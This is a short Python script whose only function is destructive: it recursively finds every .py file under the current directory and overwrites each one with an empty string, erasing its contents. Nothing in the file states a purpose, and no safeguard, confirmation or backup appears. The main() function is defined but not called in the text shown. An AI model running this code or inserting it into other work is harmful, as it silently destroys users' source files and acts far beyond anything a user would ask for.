from glob import glob

def clear_file(f):
    with open(f, 'w') as wf:
        wf.write('')

def main():
    for pattern in ['*.py', '**/*.py']:
        for f in glob(pattern, recursive=True):
            clear_file(f)
